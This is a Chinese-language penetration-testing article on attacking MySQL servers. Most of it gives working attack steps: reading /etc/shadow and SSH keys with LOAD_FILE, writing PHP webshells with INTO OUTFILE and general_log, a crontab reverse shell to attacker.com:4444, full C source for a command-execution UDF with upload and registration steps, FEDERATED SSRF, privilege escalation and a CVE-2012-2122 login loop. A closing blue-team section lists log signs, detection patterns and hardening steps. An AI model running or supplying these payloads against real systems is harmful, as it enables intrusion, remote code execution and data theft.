---
title: "MySQL LOAD_FILE/INTO OUTFILE/UDF/FEDERATED RCE与文件读写提权利用技术"
date: 2026-06-17T15:30:00+08:00
draft: false
weight: 84
description: "围绕 MySQL 的 LOAD_FILE 文件读取、INTO OUTFILE/DUMPFILE 文件写入、UDF 注入 RCE、FEDERATED 引擎 SSRF、general_log/slow_query_log WebShell 注入、权限提升，分析打点识别、数据库枚举、RCE 利用链、历史 CVE 与蓝队处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "关系数据库", "MySQL", "LOAD_FILE", "INTO OUTFILE", "UDF", "RCE", "文件读写", "提权"]
---

# MySQL LOAD_FILE/INTO OUTFILE/UDF/FEDERATED RCE与文件读写提权利用技术

`MySQL` 是全球部署量最大的开源关系数据库之一，但它的丰富功能也意味着巨大的攻击面。一个典型生产部署里，MySQL 至少同时暴露了以下攻击面：

- **Wire Protocol 面**：MySQL 协议端口（默认 `3306`，TLS 为 `3307`，X Protocol 为 `33060`），处理所有 SQL 查询
- **文件读取面**：`LOAD_FILE()` 可读取服务器文件系统上的文件
- **文件写入面**：`INTO OUTFILE`/`INTO DUMPFILE` 可将查询结果写入服务器文件
- **UDF 注入面**：User Defined Function 可加载自定义共享对象实现 RCE
- **FEDERATED 引擎面**：可建立到其他 MySQL 实例的连接，也可用于 SSRF
- **日志写入面**：`general_log`/`slow_query_log` 可写入任意路径，实现 WebShell 注入
- **权限提升面**：`DEFINER` 存储过程、`mysql.user` 直接修改、CVE-2016-6662 配置注入链

对攻击者来说，MySQL 的价值不在于某个单一漏洞，而在于它把数据存储、文件操作、代码执行与集群控制集中在同一进程里。一旦获得数据库访问权限（弱密码、默认凭据、SQL 注入），攻击者可以通过 `LOAD_FILE()` 读取任意文件、通过 `INTO OUTFILE` 写入 WebShell、通过 UDF 注入执行系统命令、通过 `FEDERATED` 引擎进行 SSRF 攻击内网服务，甚至从普通数据库用户提升到超级用户。

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 MySQL
2. 哪些未认证或弱认证场景最值得优先探测
3. 如何通过 `LOAD_FILE()` 实现文件读取
4. 如何通过 `INTO OUTFILE`/`INTO DUMPFILE` 实现文件写入
5. 如何通过 UDF 注入实现 RCE
6. 如何通过 `FEDERATED` 引擎进行 SSRF 攻击
7. 如何通过 `general_log`/`slow_query_log` 注入 WebShell
8. 如何从普通用户提升到超级用户
9. 历史 CVE 链如何从信息泄露直接打到 RCE
10. 蓝队如何从访问日志与系统日志识别这类打点

---

## 0. 攻击面概览

### 0.1 常见端口与协议

首轮至少应枚举：

- `:3306/` — MySQL 协议端口（明文/TLS）
- `:3307/` — MySQL TLS 端口（备选）
- `:33060/` — MySQL X Protocol 端口（8.0+）

### 0.2 协议特征

MySQL 使用 MySQL Wire Protocol。可以通过 nmap 或自定义工具探测：

```bash
nmap -p 3306 mysql.target.example --script mysql-info
```

```text
PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-info:
|   Protocol: 53
|   Version: 8.0.35
|   Thread ID: 1234
|   Capabilities: LONG_PASSWORD, FOUND_ROWS, LONG_COLUMN_FLAGS, CONNECT_WITH_DB, PROTOCOL_41, TRANSACTIONS, SECURE_CONNECTION, MULTI_STATEMENTS, MULTI_RESULTS, PS_MULTI_RESULTS, PLUGIN_AUTH, CONNECT_ATTRS, PLUGIN_AUTH_LENENC_CLIENT_DATA, CAN_HANDLE_EXPIRED_PASSWORDS
|   Authentication Plugin: caching_sha2_password
```

### 0.3 手动探测

也可以使用 `mysql` 客户端手动连接：

```bash
mysql -h mysql.target.example -P 3306 -u root -p
```

如果返回密码提示，说明需要认证。如果直接连接成功，说明未授权访问。

### 0.4 打点收益优先级

1. 确认目标为 MySQL、版本号与认证方式
2. 通过 `version()` 回收系统信息
3. 通过 `information_schema` 枚举所有数据库与表
4. 通过 `SELECT` 读取敏感数据
5. 判断 `LOAD_FILE()` 是否可用
6. 判断 `INTO OUTFILE`/`INTO DUMPFILE` 是否可用
7. 判断 UDF 注入是否可行
8. 判断 `FEDERATED` 引擎是否启用
9. 判断 `general_log`/`slow_query_log` 是否可配置

---

## 1. 首轮识别：确认目标为 MySQL

### 1.1 nmap 脚本探测

```bash
nmap -p 3306 mysql.target.example --script mysql-info
```

```text
PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-info:
|   Protocol: 53
|   Version: 8.0.35
|   Thread ID: 1234
|   Capabilities: LONG_PASSWORD, FOUND_ROWS, ...
|   Authentication Plugin: caching_sha2_password
```

直接回收：

- MySQL 版本
- 协议版本
- 线程 ID
- 能力标志
- 认证插件

### 1.2 mysql 连接

```bash
mysql -h mysql.target.example -P 3306 -u root
```

```text
Enter password:
```

如果返回密码提示，说明需要认证。

如果使用弱密码或默认凭据：

```bash
mysql -h mysql.target.example -P 3306 -u root -proot
```

```text
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1234
Server version: 8.0.35 MySQL Community Server - GPL

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

直接连接成功，说明弱密码或默认凭据。

### 1.3 版本查询

```sql
SELECT version();
```

```text
+-----------+
| version() |
+-----------+
| 8.0.35    |
+-----------+
```

### 1.4 当前用户与权限

```sql
SELECT current_user(), session_user();
```

```text
+----------------+----------------+
| current_user() | session_user() |
+----------------+----------------+
| root@%         | root@%         |
+----------------+
```

```sql
SELECT user, host, Super_priv, File_priv, Grant_priv FROM mysql.user WHERE user = 'root';
```

```text
+------+-----------+-----------+----------+------------+
| user | host      | Super_priv| File_priv| Grant_priv |
+------+-----------+-----------+----------+------------+
| root | %         | Y         | Y        | Y          |
+------+-----------+-----------+----------+------------+
```

暴露当前用户是否为超级用户及关键权限。

---

## 2. 数据库与表枚举

### 2.1 数据库列表

```sql
SELECT schema_name FROM information_schema.SCHEMATA;
```

```text
+--------------------+
| schema_name        |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| app_db             |
| user_data          |
| logs               |
| config             |
+--------------------+
```

### 2.2 表列表

```sql
SELECT table_schema, table_name FROM information_schema.TABLES WHERE table_schema NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys');
```

```text
+--------------+------------+
| table_schema | table_name |
+--------------+------------+
| app_db       | users      |
| app_db       | sessions   |
| app_db       | orders     |
| app_db       | payments   |
| app_db       | config     |
| app_db       | logs       |
+--------------+------------+
```

### 2.3 列信息

```sql
SELECT column_name, data_type FROM information_schema.COLUMNS WHERE table_schema = 'app_db' AND table_name = 'users';
```

```text
+---------------+--------------+
| column_name   | data_type    |
+---------------+--------------+
| id            | int          |
| username      | varchar      |
| email         | varchar      |
| password_hash | varchar      |
| role          | varchar      |
| api_key       | varchar      |
| created_at    | datetime     |
+---------------+--------------+
```

### 2.4 数据采样

```sql
SELECT * FROM app_db.users LIMIT 5;
```

```text
+----+----------+---------------------+---------------------------------------+---------------+--------------------------------+---------------------+
| id | username | email               | password_hash                         | role          | api_key                        | created_at          |
+----+----------+---------------------+---------------------------------------+---------------+--------------------------------+---------------------+
|  1 | admin    | admin@example.com   | $2b$12$Lq8aZVx8aZVx8aZVx8aZVx8aZVx   | administrator | EXAMPLE_API_KEY_NOT_REAL_VALUE   | 2026-01-15 10:00:00 |
|  2 | user1    | user1@example.com   | $2b$12$Xy9bWz9bWz9bWz9bWz9bWz9bWz9b   | user          | EXAMPLE_API_KEY_NOT_REAL_VALUE_2 | 2026-01-16 11:00:00 |
+----+----------+---------------------+---------------------------------------+---------------+--------------------------------+---------------------+
```

---

## 3. LOAD_FILE 文件读取

### 3.1 secure_file_priv 检查

`LOAD_FILE()` 受 `secure_file_priv` 系统变量限制。

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

```text
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
```

- 空值 → 无限制，可读取任意路径
- `/path/to/dir/` → 只能读取该目录下的文件
- `NULL` → 禁用 `LOAD_FILE()`

### 3.2 LOAD_FILE 读取文件

```sql
SELECT LOAD_FILE('/etc/passwd');
```

```text
+------------------------------------------------------------------------------------------------------------------+
| LOAD_FILE('/etc/passwd')                                                                                         |
+------------------------------------------------------------------------------------------------------------------+
| root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
 |
+------------------------------------------------------------------------------------------------------------------+
```

### 3.3 敏感文件目标

```sql
SELECT LOAD_FILE('/etc/shadow');
SELECT LOAD_FILE('/etc/mysql/my.cnf');
SELECT LOAD_FILE('/root/.ssh/authorized_keys');
SELECT LOAD_FILE('/root/.bash_history');
SELECT LOAD_FILE('/var/lib/mysql/mysql/user.ibd');
SELECT LOAD_FILE('/proc/self/environ');
SELECT LOAD_FILE('/proc/self/cmdline');
```

### 3.4 LOAD_FILE 限制

- 需要 `FILE` 权限
- 受 `secure_file_priv` 限制
- 文件大小必须小于 `max_allowed_packet`
- 文件必须可读（MySQL 进程权限）

---

## 4. INTO OUTFILE/DUMPFILE 文件写入

### 4.1 INTO OUTFILE 写入文件

`INTO OUTFILE` 可将查询结果写入服务器文件。

```sql
SELECT '<?php @eval($_POST["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

```text
Query OK, 1 row affected (0.01 sec)
```

### 4.2 INTO DUMPFILE 写入二进制文件

`INTO DUMPFILE` 用于写入二进制文件（无换行符、无转义）。

```sql
SELECT UNHEX('7f454c46020101000000000000000000') INTO DUMPFILE '/tmp/test.bin';
```

### 4.3 写入 crontab

```sql
SELECT '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"' INTO OUTFILE '/etc/cron.d/backdoor';
```

### 4.4 写入 SSH 公钥

```sql
SELECT 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@key' INTO OUTFILE '/root/.ssh/authorized_keys';
```

### 4.5 INTO OUTFILE 限制

- 需要 `FILE` 权限
- 受 `secure_file_priv` 限制
- 文件不能已存在（`INTO OUTFILE`）
- `INTO DUMPFILE` 可以覆盖已存在文件
- MySQL 进程必须有目标目录的写权限

---

## 5. UDF 注入 RCE

### 5.1 UDF 原理

MySQL 支持 User Defined Function（UDF），可以加载自定义共享对象（`.so` 文件）实现自定义函数。如果攻击者可以上传恶意 `.so` 文件并注册为 UDF，就可以实现 RCE。

### 5.2 检查 plugin_dir

```sql
SHOW VARIABLES LIKE 'plugin_dir';
```

```text
+---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/ |
+---------------+------------------------+
```

### 5.3 恶意 UDF 源码

```c
#include <mysql.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

my_bool rce_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    return 0;
}

char *rce(UDF_INIT *initid, UDF_ARGS *args, char *result, unsigned long *length, char *is_null, char *error) {
    char *cmd = args->args[0];
    char buffer[4096];
    FILE *fp = popen(cmd, "r");
    if (fp == NULL) {
        strcpy(result, "ERROR");
        *length = 5;
        return result;
    }
    int bytes = fread(buffer, 1, sizeof(buffer)-1, fp);
    pclose(fp);
    buffer[bytes] = '\0';
    strcpy(result, buffer);
    *length = bytes;
    return result;
}
```

### 5.4 编译恶意 UDF

```bash
gcc -shared -fPIC -o rce.so rce.c -I/usr/include/mysql
```

### 5.5 上传与注册

通过 `INTO DUMPFILE` 上传：

```sql
SELECT UNHEX('7f454c46...') INTO DUMPFILE '/usr/lib/mysql/plugin/rce.so';
```

注册函数：

```sql
CREATE FUNCTION rce RETURNS STRING SONAME 'rce.so';
```

执行命令：

```sql
SELECT rce('id');
```

```text
+--------------------------------+
| rce('id')                      |
+--------------------------------+
| uid=27(mysql) gid=27(mysql)    |
+--------------------------------+
```

清理：

```sql
DROP FUNCTION rce;
```

### 5.6 UDF 限制

- 需要 `FILE` 权限上传 `.so` 文件
- 需要 `CREATE ROUTINE` 或 `SUPER` 权限注册函数
- `plugin_dir` 必须可写
- MySQL 8.0+ 对 UDF 加载有更严格的限制

---

## 6. FEDERATED 引擎 SSRF

### 6.1 检查 FEDERATED 引擎

```sql
SHOW ENGINES;
```

```text
+--------------------+---------+
| Engine             | Support |
+--------------------+---------+
| FEDERATED          | YES     |
| InnoDB             | DEFAULT |
| MyISAM             | YES     |
+--------------------+---------+
```

### 6.2 FEDERATED 表创建

`FEDERATED` 引擎可以建立到其他 MySQL 实例的连接。

```sql
CREATE TABLE federated_test (
    id INT,
    data VARCHAR(255)
) ENGINE=FEDERATED
CONNECTION='mysql://user:password@10.20.30.50:3306/remote_db/remote_table';
```

```sql
SELECT * FROM federated_test;
```

### 6.3 FEDERATED SSRF

攻击者可以利用 `FEDERATED` 引擎连接内网服务：

```sql
CREATE TABLE ssrf_test (
    id INT
) ENGINE=FEDERATED
CONNECTION='mysql://user:password@internal-service.local:3306/test/table';
```

如果连接超时，说明主机不存在或端口未开放。如果连接被拒绝，说明主机存在但 MySQL 未运行。

### 6.4 FEDERATED DNS 解析

`FEDERATED` 会进行 DNS 解析，可以用于探测内网主机：

```sql
CREATE TABLE dns_test (
    id INT
) ENGINE=FEDERATED
CONNECTION='mysql://user:password@attacker-dns.example.com:3306/test/table';

SELECT * FROM dns_test;
```

### 6.5 FEDERATED 限制

- 需要 `FEDERATED` 引擎启用
- 需要 `CREATE TABLE` 权限
- 连接字符串中的密码会记录在日志中
- 只能连接 MySQL 协议

---

## 7. general_log/slow_query_log WebShell 注入

### 7.1 general_log 写入 WebShell

`general_log` 可以记录所有 SQL 查询到指定文件。

```sql
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/shell.php';
SELECT '<?php @eval($_POST["cmd"]); ?>';
SET GLOBAL general_log = 'OFF';
```

### 7.2 slow_query_log 写入 WebShell

`slow_query_log` 可以记录慢查询到指定文件。

```sql
SET GLOBAL slow_query_log = 'ON';
SET GLOBAL slow_query_log_file = '/var/www/html/shell.php';
SELECT '<?php @eval($_POST["cmd"]); ?>' FROM users WHERE SLEEP(10);
SET GLOBAL slow_query_log = 'OFF';
```

### 7.3 日志写入限制

- 需要 `SUPER` 权限修改全局变量
- MySQL 进程必须有目标目录的写权限
- 日志文件会包含额外的日志头部信息
- WebShell 可能被日志头部破坏

---

## 8. 权限提升

### 8.1 通过 DEFINER 存储过程提权

如果普通用户创建了 `DEFINER` 存储过程，且该过程由超级用户执行，可以通过修改过程实现提权：

```sql
CREATE DEFINER='root'@'localhost' PROCEDURE escalate()
SQL SECURITY DEFINER
BEGIN
    GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%';
END;
```

### 8.2 通过 mysql.user 直接修改

如果当前用户有 `mysql.user` 表的写权限：

```sql
UPDATE mysql.user SET Super_priv = 'Y' WHERE user = 'attacker';
FLUSH PRIVILEGES;
```

### 8.3 通过 CVE-2012-2122 认证绕过

MySQL 5.1.x-5.5.x、5.6.x 某些版本中存在 CVE-2012-2122，允许使用错误密码多次连接后绕过认证：

```bash
for i in {1..1000}; do mysql -h mysql.target.example -u root -pwrong -e "SELECT 1" 2>/dev/null && echo "Success at attempt $i" && break; done
```

### 8.4 通过 CVE-2016-6662/6663/6664 配置注入链

MySQL 5.5.x-5.7.x 某些版本中存在 CVE-2016-6662/6663/6664 链，允许从 `FILE` 权限提升到 `root` 权限：

1. 使用 `FILE` 权限写入 `my.cnf` 配置文件
2. 配置 `malloc_lib` 指向恶意共享库
3. MySQL 重启时加载恶意库，实现 root RCE

### 8.5 通过 general_log 提权

```sql
SET GLOBAL general_log_file = '/etc/mysql/conf.d/backdoor.cnf';
SET GLOBAL general_log = 'ON';
SELECT '[mysqld]\nmalloc_lib=/tmp/malicious.so';
SET GLOBAL general_log = 'OFF';
```

MySQL 重启时加载恶意配置。

---

## 9. 历史 CVE 与风险链

### 9.1 CVE-2012-2122：认证绕过

- **影响版本**：MySQL 5.1.x-5.5.x、5.6.x 某些版本
- **CVSS**：7.5（High）
- **核心问题**：`memcmp()` 时间侧信道导致认证绕过
- **利用条件**：需要网络可达 MySQL
- **影响**：使用错误密码多次连接后可能绕过认证

### 9.2 CVE-2016-6662/6663/6664：配置注入链

- **影响版本**：MySQL 5.5.x-5.7.x 某些版本
- **CVSS**：10.0（Critical）
- **核心问题**：`FILE` 权限可写入 `my.cnf`，结合 `malloc_lib` 实现 root RCE
- **利用条件**：需要 `FILE` 权限
- **影响**：从数据库用户提升到操作系统 root

### 9.3 CVE-2023-21977/21980/21962：优化器漏洞

- **影响版本**：MySQL 8.0.x 某些版本
- **CVSS**：6.5-7.5（Medium-High）
- **核心问题**：查询优化器存在缺陷，可导致拒绝服务或信息泄露
- **利用条件**：需要数据库查询权限
- **影响**：拒绝服务或潜在的信息泄露

### 9.4 综合风险链

```
端口扫描 → :3306 MySQL Wire Protocol
         ↓
nmap mysql-info → 版本确认
         ↓
mysql 连接 → 弱密码/默认凭据/CVE-2012-2122
         ↓
version() → 系统画像（版本、OS）
         ↓
information_schema → 枚举所有数据库与表
         ↓
SELECT * FROM users → 读取敏感数据（用户、密码哈希、API Key）
         ↓
LOAD_FILE('/etc/passwd') → 读取服务器文件
         ↓
INTO OUTFILE '/var/www/html/shell.php' → 写入 WebShell
         ↓
INTO DUMPFILE '/usr/lib/mysql/plugin/rce.so' → 上传恶意 UDF
         ↓
CREATE FUNCTION rce → 注册 UDF → SELECT rce('id') → RCE
         ↓
FEDERATED → SSRF 攻击内网服务
         ↓
general_log → 写入 WebShell 或 my.cnf
         ↓
CVE-2016-6662 → 配置注入 → malloc_lib → root RCE
```

---

## 10. 蓝队视角：日志痕迹与防守

### 10.1 关键日志源

**MySQL 错误日志**：

```text
2026-06-17T10:15:23.445678Z 1234 [System] [MY-010931] [Server] /usr/sbin/mysqld: ready for connections.
2026-06-17T10:15:24.129847Z 1235 [Warning] [MY-013360] [Server] Plugin mysql_native_password reported: 'Authentication of user root from host 10.0.3.47 failed'
```

**MySQL 慢查询日志**：

```text
/usr/sbin/mysqld, Version: 8.0.35 (MySQL Community Server - GPL). started with:
Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
2026-06-17T10:15:25.000847Z  1236 Query    SELECT '<?php @eval($_POST["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
```

**MySQL 通用查询日志**：

```text
2026-06-17T10:15:26.000123Z  1237 Query    LOAD_FILE('/etc/passwd')
2026-06-17T10:15:27.000456Z  1238 Query    CREATE FUNCTION rce RETURNS STRING SONAME 'rce.so'
```

### 10.2 高告警指标

| 行为 | 日志特征 | 告警级别 |
|------|----------|----------|
| 未授权访问 | 无密码连接成功 | 严重 |
| `LOAD_FILE()` 文件读取 | `LOAD_FILE` | 严重 |
| `INTO OUTFILE` 文件写入 | `INTO OUTFILE` | 严重 |
| `INTO DUMPFILE` 二进制写入 | `INTO DUMPFILE` | 严重 |
| UDF 函数创建 | `CREATE FUNCTION .* SONAME` | 严重 |
| `FEDERATED` 表创建 | `ENGINE=FEDERATED` | 高 |
| `general_log` 修改 | `SET GLOBAL general_log` | 严重 |
| `slow_query_log` 修改 | `SET GLOBAL slow_query_log` | 严重 |
| `mysql.user` 修改 | `UPDATE mysql.user` | 严重 |
| `GRANT` 提权 | `GRANT ALL PRIVILEGES` | 严重 |
| 非预期来源的连接 | 外部 IP 连接 3306 | 严重 |

### 10.3 网络层防护

- MySQL 端口 `3306` 不应直接暴露到公网
- 使用 `bind-address` 限制监听地址
- 使用 `my.cnf` 中的 `skip-networking` 禁用网络（仅本地访问）
- 启用 TLS 加密通信
- 使用强密码或证书认证
- 禁用 `FEDERATED` 引擎

### 10.4 配置加固

- 升级 MySQL 到最新稳定版本，修复所有已知 CVE
- 设置 `secure_file_priv` 限制文件读写路径
- 禁用 `FILE` 权限（对非管理员用户）
- 禁用 `FEDERATED` 引擎
- 限制 `plugin_dir` 权限
- 启用审计日志并推送到不可篡改存储
- 定期审计用户权限与角色
- 禁用不必要的存储过程与函数

---

## 11. 审查清单

| 检查项 | 说明 |
|--------|------|
| 3306 端口是否对外暴露 | 确认 MySQL 协议可达范围 |
| 是否存在弱密码 | 检查所有用户密码 |
| `secure_file_priv` 是否配置 | 检查文件读写限制 |
| `FILE` 权限是否受限 | 检查非管理员用户权限 |
| `FEDERATED` 引擎是否禁用 | 检查 `SHOW ENGINES` |
| `plugin_dir` 权限是否受限 | 检查目录权限 |
| `general_log`/`slow_query_log` 是否受限 | 检查全局变量修改权限 |
| 是否存在 `DEFINER` 存储过程 | 检查 `mysql.proc` |
| 版本是否已修复已知 CVE | 对比 MySQL 版本号 |
| 是否启用审计日志 | 检查 `general_log` 配置 |
| `bind-address` 是否受限 | 检查监听地址 |
| 是否启用 TLS | 检查 `ssl` 配置 |

---

## 12. 总结

MySQL 的攻击面价值在于它把数据存储、文件操作、代码执行与集群控制集中在同一进程里。获得数据库访问权限后，攻击者可以通过 `LOAD_FILE()` 读取任意文件、通过 `INTO OUTFILE` 写入 WebShell、通过 UDF 注入执行系统命令、通过 `FEDERATED` 引擎进行 SSRF 攻击，甚至从普通用户提升到操作系统 root。

从攻击者视角看，最高效的路径是：

1. 通过 nmap 确认目标为 MySQL
2. 通过 mysql 客户端确认弱密码或默认凭据
3. 通过 `version()` 回收系统画像
4. 通过 `information_schema` 枚举数据库与表
5. 通过 `SELECT` 读取敏感数据
6. 通过 `LOAD_FILE()` 读取服务器文件
7. 通过 `INTO OUTFILE` 写入 WebShell 或 crontab
8. 通过 UDF 注入实现 RCE
9. 通过 `FEDERATED` 引擎进行 SSRF 攻击内网
10. 通过 `general_log`/`slow_query_log` 注入 WebShell
11. 通过 CVE-2016-6662 配置注入链实现 root RCE

从防守视角看，核心措施是：

1. 永远不要将 MySQL 暴露到公网
2. 使用强密码，禁用默认凭据
3. 设置 `secure_file_priv` 限制文件读写
4. 禁用 `FILE` 权限（对非管理员用户）
5. 禁用 `FEDERATED` 引擎
6. 限制 `plugin_dir` 权限
7. 启用审计日志并推送到不可篡改存储
8. 定期审计用户权限与角色
